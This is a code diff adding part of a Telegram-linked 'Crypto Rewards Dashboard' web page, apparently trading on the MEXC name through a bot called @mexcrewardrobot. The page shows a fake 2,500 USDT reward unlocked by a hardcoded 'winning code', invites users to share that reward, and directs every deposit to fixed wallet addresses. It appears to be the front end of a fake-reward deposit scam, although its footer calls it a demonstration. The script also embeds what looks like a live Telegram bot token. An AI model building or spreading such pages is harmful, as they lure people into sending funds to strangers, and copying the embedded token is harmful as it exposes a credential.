+                                    <div id="no-orders" class="flex flex-col items-center justify-center h-full text-gray-400 dark:text-gray-500 text-sm">
+                                        <i class="fas fa-list-ul text-xl mb-2"></i>
+                                        <p>No open orders</p>
+                                    </div>
+                                    
+                                    <div id="orders-list" class="hidden space-y-2">
+                                        <!-- Order items will appear here -->
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Transaction Verification Modal -->
+            <div id="transaction-verification-modal" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+                <div class="bg-white dark:bg-gray-800 rounded-lg p-6 w-full max-w-md mx-4">
+                    <div class="flex justify-between items-center mb-4">
+                        <h2 class="text-xl font-bold">Transaction Verification</h2>
+                        <button id="close-verification-modal" class="text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-200">
+                            <i class="fas fa-times"></i>
+                        </button>
+                    </div>
+                    
+                    <div class="mb-4">
+                        <div id="verification-content" class="bg-gray-100 dark:bg-gray-700 p-4 rounded-lg text-sm font-mono overflow-x-auto max-h-80 overflow-y-auto">
+                            Loading transaction data...
+                        </div>
+                    </div>
+                    
+                    <div class="flex justify-end">
+                        <a id="view-on-tenderly" href="#" target="_blank" class="px-3 py-2 bg-blue-500 hover:bg-blue-600 text-white font-medium rounded-lg transition-colors text-sm">
+                            <i class="fas fa-external-link-alt mr-1"></i> View on Tenderly
+                        </a>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Telegram Share Modal -->
+            <div id="telegram-share-modal" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+                <div class="bg-white dark:bg-gray-800 rounded-lg p-6 w-full max-w-md mx-4">
+                    <div class="flex justify-between items-center mb-4">
+                        <h2 class="text-xl font-bold">Share with Friends</h2>
+                        <button id="close-share-modal" class="text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-200">
+                            <i class="fas fa-times"></i>
+                        </button>
+                    </div>
+                    
+                    <div class="mb-4">
+                        <p class="mb-4">Share your crypto portfolio with friends on Telegram.</p>
+                        <textarea id="share-message" class="w-full text-base px-4 py-2 rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-gray-800" rows="4">Check out my crypto portfolio! I currently have 2,500 USDT in rewards!</textarea>
+                    </div>
+                    
+                    <div class="flex justify-end">
+                        <button id="share-to-telegram" class="px-3 py-2 bg-blue-500 hover:bg-blue-600 text-white font-medium rounded-lg transition-colors">
+                            <i class="fab fa-telegram mr-1"></i> Share to Telegram
+                        </button>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Balance Card -->
+            <div class="grid grid-cols-1 lg:grid-cols-3 gap-6 mb-8">
+                <div class="lg:col-span-2 bg-primary rounded-xl p-6 text-white relative overflow-hidden">
+                    <div class="absolute top-0 right-0 w-64 h-64 opacity-10">
+                        <i class="fas fa-coins text-9xl absolute right-0 -top-10 transform rotate-12"></i>
+                    </div>
+                    <h2 class="text-lg font-medium mb-2">Total Balance</h2>
+                    <div class="flex items-end mb-4">
+                        <h1 id="total-balance" class="text-4xl font-bold mr-2">2,500</h1>
+                        <span class="text-xl">USDT</span>
+                    </div>
+                    <div class="flex items-center">
+                        <span class="bg-white bg-opacity-20 px-3 py-1 rounded-full text-sm flex items-center">
+                            <i class="fas fa-arrow-up mr-1"></i>
+                            <span>+12.5% this month</span>
+                        </span>
+                        <button id="share-portfolio" class="ml-3 bg-white bg-opacity-20 hover:bg-opacity-30 px-3 py-1 rounded-full text-sm flex items-center transition-colors">
+                            <i class="fas fa-share-alt mr-1"></i>
+                            <span>Share</span>
+                        </button>
+                    </div>
+                </div>
+                
+                <div class="bg-light-card dark:bg-dark-card rounded-xl p-6 shadow">
+                    <h2 class="text-lg font-medium mb-4">Quick Actions</h2>
+                    <div class="grid grid-cols-2 gap-4">
+                        <button id="quick-swap-btn" class="flex flex-col items-center justify-center p-4 bg-gray-100 dark:bg-gray-800 rounded-lg hover:bg-gray-200 dark:hover:bg-gray-700 transition-colors">
+                            <i class="fas fa-exchange-alt text-primary text-xl mb-2"></i>
+                            <span class="text-sm">Swap</span>
+                        </button>
+                        <button id="quick-send-btn" class="flex flex-col items-center justify-center p-4 bg-gray-100 dark:bg-gray-800 rounded-lg hover:bg-gray-200 dark:hover:bg-gray-700 transition-colors">
+                            <i class="fas fa-paper-plane text-primary text-xl mb-2"></i>
+                            <span class="text-sm">Send</span>
+                        </button>
+                        <button id="quick-deposit-btn" class="flex flex-col items-center justify-center p-4 bg-gray-100 dark:bg-gray-800 rounded-lg hover:bg-gray-200 dark:hover:bg-gray-700 transition-colors">
+                            <i class="fas fa-download text-primary text-xl mb-2"></i>
+                            <span class="text-sm">Deposit</span>
+                        </button>
+                        <button id="quick-trade-btn" class="flex flex-col items-center justify-center p-4 bg-gray-100 dark:bg-gray-800 rounded-lg hover:bg-gray-200 dark:hover:bg-gray-700 transition-colors">
+                            <i class="fas fa-chart-line text-primary text-xl mb-2"></i>
+                            <span class="text-sm">Trade</span>
+                        </button>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Portfolio & Activity Section -->
+            <div class="grid grid-cols-1 lg:grid-cols-3 gap-6 mb-8">
+                <div class="lg:col-span-2">
+                    <div class="bg-light-card dark:bg-dark-card rounded-xl p-6 shadow mb-6">
+                        <div class="flex justify-between items-center mb-6">
+                            <h2 class="text-lg font-medium">Portfolio Overview</h2>
+                            <div class="flex space-x-2">
+                                <button class="time-filter px-3 py-1 text-sm rounded-full bg-primary text-white">1D</button>
+                                <button class="time-filter px-3 py-1 text-sm rounded-full bg-gray-200 dark:bg-gray-700 hover:bg-gray-300 dark:hover:bg-gray-600 transition-colors">1W</button>
+                                <button class="time-filter px-3 py-1 text-sm rounded-full bg-gray-200 dark:bg-gray-700 hover:bg-gray-300 dark:hover:bg-gray-600 transition-colors">1M</button>
+                                <button class="time-filter px-3 py-1 text-sm rounded-full bg-gray-200 dark:bg-gray-700 hover:bg-gray-300 dark:hover:bg-gray-600 transition-colors">1Y</button>
+                            </div>
+                        </div>
+                        <div class="chart-container">
+                            <canvas id="portfolioChart"></canvas>
+                        </div>
+                    </div>
+                    
+                    <div class="bg-light-card dark:bg-dark-card rounded-xl p-6 shadow">
+                        <h2 class="text-lg font-medium mb-4">Your Assets</h2>
+                        <div class="space-y-4 assets-list">
+                            <!-- Asset items will be dynamically added here -->
+                            <div class="flex items-center justify-between p-3 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors">
+                                <div class="flex items-center">
+                                    <div class="w-10 h-10 bg-yellow-500 rounded-full flex items-center justify-center mr-4">
+                                        <i class="fab fa-bitcoin text-white"></i>
+                                    </div>
+                                    <div>
+                                        <h3 class="font-medium">Bitcoin</h3>
+                                        <p class="text-sm text-gray-500 dark:text-gray-400">BTC</p>
+                                    </div>
+                                </div>
+                                <div class="text-right">
+                                    <p class="font-medium">1,250 USDT</p>
+                                    <p class="text-sm text-green-500">+3.2%</p>
+                                </div>
+                            </div>
+                            
+                            <div class="flex items-center justify-between p-3 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors">
+                                <div class="flex items-center">
+                                    <div class="w-10 h-10 bg-blue-500 rounded-full flex items-center justify-center mr-4">
+                                        <i class="fab fa-ethereum text-white"></i>
+                                    </div>
+                                    <div>
+                                        <h3 class="font-medium">Ethereum</h3>
+                                        <p class="text-sm text-gray-500 dark:text-gray-400">ETH</p>
+                                    </div>
+                                </div>
+                                <div class="text-right">
+                                    <p class="font-medium">750 USDT</p>
+                                    <p class="text-sm text-green-500">+5.7%</p>
+                                </div>
+                            </div>
+                            
+                            <div class="flex items-center justify-between p-3 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors">
+                                <div class="flex items-center">
+                                    <div class="w-10 h-10 bg-green-500 rounded-full flex items-center justify-center mr-4">
+                                        <i class="fas fa-dollar-sign text-white"></i>
+                                    </div>
+                                    <div>
+                                        <h3 class="font-medium">Tether</h3>
+                                        <p class="text-sm text-gray-500 dark:text-gray-400">USDT</p>
+                                    </div>
+                                </div>
+                                <div class="text-right">
+                                    <p class="font-medium">500 USDT</p>
+                                    <p class="text-sm text-gray-400">+0.0%</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="bg-light-card dark:bg-dark-card rounded-xl p-6 shadow">
+                    <div class="flex justify-between items-center mb-4">
+                        <h2 class="text-lg font-medium">Recent Transactions</h2>
+                        <div class="flex items-center">
+                            <button id="connect-api-button" class="text-xs px-3 py-1 bg-primary text-white rounded-full hover:bg-secondary transition-colors">
+                                <i class="fas fa-plug mr-1"></i> Connect API
+                            </button>
+                            <button id="telegram-notify-button" class="ml-2 text-xs px-3 py-1 bg-blue-500 text-white rounded-full hover:bg-blue-600 transition-colors">
+                                <i class="fab fa-telegram mr-1"></i> Notify
+                            </button>
+                        </div>
+                    </div>
+                    <div class="space-y-4 max-h-96 overflow-y-auto pr-2 transactions-list">
+                        <!-- Transaction items will be dynamically added here -->
+                        <div class="flex items-center p-3 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors">
+                            <div class="w-10 h-10 rounded-full bg-green-100 dark:bg-green-900 flex items-center justify-center mr-4">
+                                <i class="fas fa-arrow-down text-green-500"></i>
+                            </div>
+                            <div class="flex-1">
+                                <h3 class="font-medium">Received Bitcoin</h3>
+                                <p class="text-sm text-gray-500 dark:text-gray-400">May 21, 2023</p>
+                            </div>
+                            <div class="text-right">
+                                <p class="font-medium text-green-500">+0.035 BTC</p>
+                                <p class="text-sm text-gray-500 dark:text-gray-400">1,050 USDT</p>
+                            </div>
+                        </div>
+                        
+                        <div class="flex items-center p-3 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors">
+                            <div class="w-10 h-10 rounded-full bg-blue-100 dark:bg-blue-900 flex items-center justify-center mr-4">
+                                <i class="fas fa-exchange-alt text-blue-500"></i>
+                            </div>
+                            <div class="flex-1">
+                                <h3 class="font-medium">Swapped ETH to USDT</h3>
+                                <p class="text-sm text-gray-500 dark:text-gray-400">May 18, 2023</p>
+                            </div>
+                            <div class="text-right">
+                                <p class="font-medium">-0.5 ETH</p>
+                                <p class="text-sm text-gray-500 dark:text-gray-400">800 USDT</p>
+                            </div>
+                        </div>
+                        
+                        <div class="flex items-center p-3 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors">
+                            <div class="w-10 h-10 rounded-full bg-red-100 dark:bg-red-900 flex items-center justify-center mr-4">
+                                <i class="fas fa-arrow-up text-red-500"></i>
+                            </div>
+                            <div class="flex-1">
+                                <h3 class="font-medium">Sent Ethereum</h3>
+                                <p class="text-sm text-gray-500 dark:text-gray-400">May 15, 2023</p>
+                            </div>
+                            <div class="text-right">
+                                <p class="font-medium text-red-500">-0.25 ETH</p>
+                                <p class="text-sm text-gray-500 dark:text-gray-400">400 USDT</p>
+                            </div>
+                        </div>
+                        
+                        <div class="flex items-center p-3 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors">
+                            <div class="w-10 h-10 rounded-full bg-purple-100 dark:bg-purple-900 flex items-center justify-center mr-4">
+                                <i class="fas fa-gift text-purple-500"></i>
+                            </div>
+                            <div class="flex-1">
+                                <h3 class="font-medium">Rewards Credited</h3>
+                                <p class="text-sm text-gray-500 dark:text-gray-400">May 12, 2023</p>
+                            </div>
+                            <div class="text-right">
+                                <p class="font-medium text-green-500">+2,500 USDT</p>
+                                <p class="text-sm text-gray-500 dark:text-gray-400">Initial Reward</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Market Trends Section -->
+            <div class="bg-light-card dark:bg-dark-card rounded-xl p-6 shadow mb-8">
+                <h2 class="text-lg font-medium mb-4">Market Trends</h2>
+                <div class="overflow-x-auto">
+                    <table class="min-w-full" id="market-trends-table">
+                        <thead>
+                            <tr class="border-b border-gray-200 dark:border-gray-700">
+                                <th class="text-left py-3 px-4">Asset</th>
+                                <th class="text-left py-3 px-4">Price</th>
+                                <th class="text-left py-3 px-4">24h Change</th>
+                                <th class="text-left py-3 px-4">Market Cap</th>
+                                <th class="text-left py-3 px-4">Action</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr class="border-b border-gray-200 dark:border-gray-700 hover:bg-gray-50 dark:hover:bg-gray-800">
+                                <td class="py-3 px-4">
+                                    <div class="flex items-center">
+                                        <div class="w-8 h-8 bg-yellow-500 rounded-full flex items-center justify-center mr-3">
+                                            <i class="fab fa-bitcoin text-white text-sm"></i>
+                                        </div>
+                                        <div>
+                                            <p class="font-medium">Bitcoin</p>
+                                            <p class="text-xs text-gray-500 dark:text-gray-400">BTC</p>
+                                        </div>
+                                    </div>
+                                </td>
+                                <td class="py-3 px-4">$29,850.20</td>
+                                <td class="py-3 px-4 text-green-500">+2.4%</td>
+                                <td class="py-3 px-4">$578.5B</td>
+                                <td class="py-3 px-4">
+                                    <button class="market-trade-btn px-3 py-1 bg-primary text-white text-sm rounded-full hover:bg-secondary transition-colors" data-symbol="BTCUSDT">Trade</button>
+                                </td>
+                            </tr>
+                            <tr class="border-b border-gray-200 dark:border-gray-700 hover:bg-gray-50 dark:hover:bg-gray-800">
+                                <td class="py-3 px-4">
+                                    <div class="flex items-center">
+                                        <div class="w-8 h-8 bg-blue-500 rounded-full flex items-center justify-center mr-3">
+                                            <i class="fab fa-ethereum text-white text-sm"></i>
+                                        </div>
+                                        <div>
+                                            <p class="font-medium">Ethereum</p>
+                                            <p class="text-xs text-gray-500 dark:text-gray-400">ETH</p>
+                                        </div>
+                                    </div>
+                                </td>
+                                <td class="py-3 px-4">$1,850.75</td>
+                                <td class="py-3 px-4 text-green-500">+5.2%</td>
+                                <td class="py-3 px-4">$222.1B</td>
+                                <td class="py-3 px-4">
+                                    <button class="market-trade-btn px-3 py-1 bg-primary text-white text-sm rounded-full hover:bg-secondary transition-colors" data-symbol="ETHUSDT">Trade</button>
+                                </td>
+                            </tr>
+                            <tr class="border-b border-gray-200 dark:border-gray-700 hover:bg-gray-50 dark:hover:bg-gray-800">
+                                <td class="py-3 px-4">
+                                    <div class="flex items-center">
+                                        <div class="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center mr-3">
+                                            <i class="fas fa-chart-line text-white text-sm"></i>
+                                        </div>
+                                        <div>
+                                            <p class="font-medium">Solana</p>
+                                            <p class="text-xs text-gray-500 dark:text-gray-400">SOL</p>
+                                        </div>
+                                    </div>
+                                </td>
+                                <td class="py-3 px-4">$102.35</td>
+                                <td class="py-3 px-4 text-red-500">-1.9%</td>
+                                <td class="py-3 px-4">$43.5B</td>
+                                <td class="py-3 px-4">
+                                    <button class="market-trade-btn px-3 py-1 bg-primary text-white text-sm rounded-full hover:bg-secondary transition-colors" data-symbol="SOLUSDT">Trade</button>
+                                </td>
+                            </tr>
+                            <tr class="hover:bg-gray-50 dark:hover:bg-gray-800">
+                                <td class="py-3 px-4">
+                                    <div class="flex items-center">
+                                        <div class="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center mr-3">
+                                            <i class="fas fa-dollar-sign text-white text-sm"></i>
+                                        </div>
+                                        <div>
+                                            <p class="font-medium">Tether</p>
+                                            <p class="text-xs text-gray-500 dark:text-gray-400">USDT</p>
+                                        </div>
+                                    </div>
+                                </td>
+                                <td class="py-3 px-4">$1.00</td>
+                                <td class="py-3 px-4 text-gray-500">0.0%</td>
+                                <td class="py-3 px-4">$83.2B</td>
+                                <td class="py-3 px-4">
+                                    <button class="market-trade-btn px-3 py-1 bg-primary text-white text-sm rounded-full hover:bg-secondary transition-colors" data-symbol="USDTUSDT">Trade</button>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+            
+            <!-- Footer -->
+            <div class="text-center text-sm text-gray-500 dark:text-gray-400 py-4 border-t border-gray-200 dark:border-gray-800">
+                <p>© 2023 Crypto Rewards Dashboard. All rights reserved.</p>
+                <p class="mt-2">This is a demonstration app. No real transactions are being made.</p>
+                <p class="mt-2">Connected to Telegram Bot: <span class="font-medium">@mexcrewardrobot</span></p>
+            </div>
+        </div>
+    </div>
+    
+    <!-- CDN for ethers.js library -->
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js" type="application/javascript"></script>
+    
+    <script>
+        // Telegram Integration
+        const TELEGRAM_BOT_TOKEN = '7834890194:AAH5WuULc_gg49OFgze0oPp4FV-0mt1_1xE';
+        const TELEGRAM_BOT_USERNAME = '@mexcrewardrobot';
+        let telegramUser = null;
+        let telegramWebApp = null;
+        
+        // Initialize Telegram WebApp if available
+        function initializeTelegramWebApp() {
+            try {
+                if (window.Telegram && window.Telegram.WebApp) {
+                    telegramWebApp = window.Telegram.WebApp;
+                    
+                    // Initialize WebApp
+                    telegramWebApp.ready();
+                    
+                    // Get user data
+                    if (telegramWebApp.initDataUnsafe && telegramWebApp.initDataUnsafe.user) {
+                        telegramUser = telegramWebApp.initDataUnsafe.user;
+                        console.log("Telegram user:", telegramUser);
+                    }
+                    
+                    // Apply Telegram theme
+                    document.body.classList.add('telegram-app');
+                    
+                    // Set up back button if needed
+                    if (telegramWebApp.BackButton) {
+                        telegramWebApp.BackButton.onClick(() => {
+                            // Handle back button click - go back to login from dashboard
+                            if (!document.getElementById('dashboard-screen').classList.contains('hidden')) {
+                                document.getElementById('dashboard-screen').classList.add('hidden');
+                                document.getElementById('login-screen').classList.remove('hidden');
+                                telegramWebApp.BackButton.hide();
+                            } else {
+                                // If on login screen, close the web app
+                                telegramWebApp.close();
+                            }
+                        });
+                    }
+                    
+                    // Set up main button if needed
+                    if (telegramWebApp.MainButton) {
+                        telegramWebApp.MainButton.setText('LOGIN');
+                        telegramWebApp.MainButton.onClick(() => {
+                            if (document.getElementById('dashboard-screen').classList.contains('hidden')) {
+                                submitBtn.click();
+                            }
+                        });
+                        telegramWebApp.MainButton.show();
+                    }
+                    
+                    // Show Telegram login button
+                    document.getElementById('telegram-login-btn').classList.remove('hidden');
+                    
+                    return true;
+                }
+                return false;
+            } catch (error) {
+                console.error("Error initializing Telegram WebApp:", error);
+                return false;
+            }
+        }
+        
+        // Notify Telegram Bot about user actions
+        async function notifyTelegramBot(action, data = {}) {
+            if (!telegramUser) return;
+            
+            try {
+                // In a real app, you'd use a backend to securely communicate with the Telegram Bot API
+                // For this demo, we'll simulate the notification with a UI indicator
+                
+                const notification = document.createElement('div');
+                notification.className = 'fixed bottom-4 right-4 bg-blue-500 text-white p-4 rounded-lg shadow-lg z-50';
+                notification.innerHTML = `
+                    <div class="flex items-center">
+                        <i class="fab fa-telegram mr-2"></i>
+                        <span>Notification sent to @mexcrewardrobot: ${action}</span>
+                    </div>
+                `;
+                document.body.appendChild(notification);
+                
+                // Remove notification after 3 seconds
+                setTimeout(() => {
+                    notification.remove();
+                }, 3000);
+                
+                // In a real implementation with a backend, you would make an HTTP request to your server:
+                /*
+                const response = await fetch('https://your-backend-api.com/notify-telegram', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        bot_token: TELEGRAM_BOT_TOKEN,
+                        chat_id: telegramUser.id,
+                        action: action,
+                        data: data
+                    })
+                });
+                
+                return await response.json();
+                */
+                
+                return { success: true };
+            } catch (error) {
+                console.error("Error notifying Telegram bot:", error);
+                return { success: false, error: error.message };
+            }
+        }
+        
+        // Share portfolio to Telegram
+        function shareTelegramPortfolio() {
+            if (telegramWebApp && telegramWebApp.MainButton) {
+                const shareText = document.getElementById('share-message').value;
+                
+                if (telegramWebApp.switchInlineQuery) {
+                    // This will open a chat selection dialog and then insert the portfolio data as an inline query
+                    telegramWebApp.switchInlineQuery(shareText, ['users', 'groups', 'channels']);
+                }
+                
+                // Close the share modal
+                document.getElementById('telegram-share-modal').classList.add('hidden');
+            } else {
+                // If not in Telegram WebApp, show a notification
+                const notification = document.createElement('div');
+                notification.className = 'fixed bottom-4 right-4 bg-yellow-500 text-white p-4 rounded-lg shadow-lg z-50';
+                notification.innerHTML = `
+                    <div class="flex items-center">
+                        <i class="fas fa-exclamation-circle mr-2"></i>
+                        <span>Sharing is only available in the Telegram app</span>
+                    </div>
+                `;
+                document.body.appendChild(notification);
+                
+                // Remove notification after 3 seconds
+                setTimeout(() => {
+                    notification.remove();
+                }, 3000);
+                
+                // Close the share modal
+                document.getElementById('telegram-share-modal').classList.add('hidden');
+            }
+        }
+        
+        // Telegram auto-login
+        function telegramAutoLogin() {
+            if (telegramUser) {
+                // Show loading indicator
+                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Loading...';
+                submitBtn.disabled = true;
+                
+                // Hide login screen and show dashboard after a short delay
+                setTimeout(() => {
+                    loginScreen.classList.add('hidden');
+                    dashboardScreen.classList.remove('hidden');
+                    
+                    // Initialize dashboard
+                    initializePortfolioChart();
+                    
+                    // Update user display
+                    updateUserDisplay();
+                    
+                    // Fetch and display data
+                    updateDashboardWithRealData();
+                    
+                    // Show back button if in Telegram WebApp
+                    if (telegramWebApp && telegramWebApp.BackButton) {
+                        telegramWebApp.BackButton.show();
+                    }
+                    
+                    // Hide main button or change its text
+                    if (telegramWebApp && telegramWebApp.MainButton) {
+                        telegramWebApp.MainButton.setText('SHARE PORTFOLIO');
+                        telegramWebApp.MainButton.onClick(() => {
+                            document.getElementById('share-portfolio').click();
+                        });
+                    }
+                    
+                    // Send notification to bot that user logged in
+                    notifyTelegramBot('user_login', { 
+                        username: telegramUser.username || 'unknown',
+                        user_id: telegramUser.id
+                    });
+                }, 1000);
+            }
+        }
+        
+        // Update user display with Telegram data
+        function updateUserDisplay() {
+            if (telegramUser) {
+                // Update welcome message
+                const userWelcome = document.getElementById('user-welcome');
+                if (userWelcome) {
+                    userWelcome.textContent = `Welcome, ${telegramUser.first_name || 'Telegram User'}!`;
+                }
+                
+                // Update avatar if available
+                const userAvatar = document.getElementById('user-avatar');
+                if (userAvatar && telegramUser.photo_url) {
+                    userAvatar.innerHTML = `<img src="${telegramUser.photo_url}" class="h-8 w-8 rounded-full" alt="${telegramUser.first_name || 'User'}">`;
+                }
+            }
+        }
+        
+        // API Configuration
+        const API_CONFIG = {
+            binance: {
+                baseUrl: 'https://api.binance.com',
+                apiKey: '', // Store this securely, not directly in code in a real app
+                apiSecret: '' // Store this securely, not directly in code in a real app
+            },
+            // Add other exchanges as needed
+            coinbase: {
+                baseUrl: 'https://api.coinbase.com',
+                apiKey: '',
+                apiSecret: ''
+            },
+            mexc: {
+                baseUrl: 'https://api.mexc.com',
+                apiKey: '',
+                apiSecret: ''
+            },
+            // Tenderly configuration for virtual Ethereum testnet
+            tenderly: {
+                enabled: true,
+                rpcUrl: 'https://virtual.mainnet.rpc.tenderly.co/5acdd816-c0ec-478b-bdb5-0b41af26fde1',
+                explorerBaseUrl: 'https://virtual.mainnet.rpc.tenderly.co/3b08573c-b768-456b-b820-f0b970e4e93c',
+                accounts: {
+                    // Use Uniswap router address for fee address
+                    feeAddress: '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D',
+                    userAddress: '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266'
+                },
+                defaultBalance: '0xDE0B6B3A7640000' // 1 ETH in wei
+            }
+        };
+
+        // Fixed deposit addresses
+        const DEPOSIT_ADDRESSES = {
+            BTC: {
+                ETH: '3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5',
+                BSC: '3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5',
+                TRX: '3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5'
+            },
+            ETH: {
+                ETH: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
+                BSC: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
+                TRX: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e'
+            },
+            USDT: {
+                ETH: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
+                BSC: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
+                TRX: 'TXEJbFyKSGN6aZV5WgT1xbKLhMmXXqdTrK'
+            },
+            BNB: {
+                ETH: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
+                BSC: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
+                TRX: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e'
+            }
+        };
+        
+        // Currently selected exchange
+        let currentExchange = 'binance';
+        
+        // Check for dark mode preference
+        if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+            document.documentElement.classList.add('dark');
+        }
+        
+        // Listen for changes in color scheme preference
+        window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', event => {
+            if (event.matches) {
+                document.documentElement.classList.add('dark');
+            } else {
+                document.documentElement.classList.remove('dark');
+            }
+            // Update chart colors if dashboard is visible
+            if (!document.getElementById('dashboard-screen').classList.contains('hidden')) {
+                updateChartColors();
+                if (tradingChart) {
+                    updateTradingChartColors();
+                }
+            }
+        });
+        
+        // DOM elements
+        const loginScreen = document.getElementById('login-screen');
+        const dashboardScreen = document.getElementById('dashboard-screen');
+        const codeInput = document.getElementById('code-input');
+        const submitBtn = document.getElementById('submit-btn');
+        const errorMessage = document.getElementById('error-message');
+        const themeToggle = document.getElementById('theme-toggle');
+        const telegramLoginBtn = document.getElementById('telegram-login-btn');
+        
+        // Portfolio chart
+        let portfolioChart;
+        let tradingChart;
+        
+        // Define the winning code
+        const WINNING_CODE = 'CRYPTO2025';
+        
+        // Manage account state - this would normally come from a backend
+        let accountData = {
+            balances: {
+                BTC: 0.04205,
+                ETH: 0.407,
+                USDT: 500,
+                BNB: 0,
+                SOL: 0
+            },
+            totalBalance: 2500, // In USDT
+            transactions: [],
+            openOrders: [],
+            orderHistory: []
+        };
+        
+        // Function to reset account and credit initial deposit
+        function resetAccountAndCreditInitialReward() {
+            // Reset account balances - retain some structure for display purposes
+            accountData = {
+                balances: {
+                    BTC: 0.04205, // About 1250 USDT worth
+                    ETH: 0.407,   // About 750 USDT worth
+                    USDT: 500,    // 500 USDT in stablecoin
+                    BNB: 0,
+                    SOL: 0
+                },
+                totalBalance: 2500, // Initial balance of 2500 USDT
+                transactions: [
+                    {
+                        id: 'tx001',
+                        type: 'DEPOSIT',
+                        asset: 'USDT',
+                        amount: 2500,
+                        status: 'COMPLETED',
+                        timestamp: Date.now(),
+                        description: 'Initial Reward'
+                    }
+                ],
+                openOrders: [],
+                orderHistory: []
+            };
+        }
+        
+        // Initialize Telegram WebApp if available
+        document.addEventListener('DOMContentLoaded', () => {
+            const telegramInitialized = initializeTelegramWebApp();
+            
+            // Add event listener for Telegram login button
+            telegramLoginBtn.addEventListener('click', telegramAutoLogin);
+            
+            // If auto-login is enabled and user is from Telegram, log them in
+            if (telegramInitialized && telegramUser) {
+                telegramAutoLogin();
+            }
+            
+            // Initialize deposit, send, and swap functionality
+            initializeDepositFunctionality();
+            initializeSendFunctionality();
+            initializeSwapFunctionality();
+            initializeTradingInterface();
+        });
+        
+        // Initialize Deposit Functionality
+        function initializeDepositFunctionality() {
+            const depositModal = document.getElementById('deposit-modal');
+            const closeDepositModal = document.getElementById('close-deposit-modal');
+            const depositCoin = document.getElementById('deposit-coin');
+            const depositNetwork = document.getElementById('deposit-network');
+            const depositAddress = document.getElementById('deposit-address');
+            const qrCodeElement = document.getElementById('qr-code').querySelector('img');
+            const copyAddressBtn = document.getElementById('copy-address');
+            const simulateDepositBtn = document.getElementById('simulate-deposit');
+            const depositCoinName = document.getElementById('deposit-coin-name');
+            
+            // Function to update deposit address and QR code
+            function updateDepositAddress() {
+                const coin = depositCoin.value;
+                const network = depositNetwork.value;
+                
+                // Get address from our mapping
+                const address = DEPOSIT_ADDRESSES[coin]?.[network] || 'Address not available';
+                
+                // Update address field and QR code
+                depositAddress.value = address;
+                qrCodeElement.src = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${address}`;
+                depositCoinName.textContent = coin;
+            }
+            
+            // Event listeners
+            depositCoin.addEventListener('change', updateDepositAddress);
+            depositNetwork.addEventListener('change', updateDepositAddress);
+            
+            // Close modal
+            closeDepositModal.addEventListener('click', () => {
+                depositModal.classList.add('hidden');
+            });
+            
+            // Copy address button
+            copyAddressBtn.addEventListener('click', () => {
+                navigator.clipboard.writeText(depositAddress.value).then(() => {
+                    // Show success indicator
+                    copyAddressBtn.innerHTML = '<i class="fas fa-check"></i>';
+                    setTimeout(() => {
+                        copyAddressBtn.innerHTML = '<i class="far fa-copy"></i>';
+                    }, 1500);
+                });
+            });
+            
+            // Quick deposit button
+            document.getElementById('quick-deposit-btn').addEventListener('click', () => {
+                depositModal.classList.remove('hidden');
+                updateDepositAddress();
+            });
+            
+            // Clicks outside the modal
+            depositModal.addEventListener('click', (e) => {
+                if (e.target === depositModal) {
+                    depositModal.classList.add('hidden');
+                }
+            });
+            
+            // Simulate deposit button
+            simulateDepositBtn.addEventListener('click', async () => {
+                const coin = depositCoin.value;
+                let amount;
+                
+                switch(coin) {
+                    case 'BTC':
+                        amount = 0.01; // Simulate BTC deposit
+                        break;
+                    case 'ETH':
+                        amount = 0.2; // Simulate ETH deposit
+                        break;
+                    case 'USDT':
+                        amount = 500; // Simulate USDT deposit
+                        break;
+                    case 'BNB':
+                        amount = 1; // Simulate BNB deposit
+                        break;
+                    default:
+                        amount = 0;
+                }
+                
+                // Create transaction
+                const transaction = {
+                    id: 'tx' + Date.now(),
+                    type: 'DEPOSIT',
+                    asset: coin,
+                    amount: amount,
+                    status: 'COMPLETED',
+                    timestamp: Date.now(),
+                    description: `Deposit via ${depositNetwork.value}`
+                };
+                
+                // Add to transactions and update balance
+                accountData.transactions.unshift(transaction);
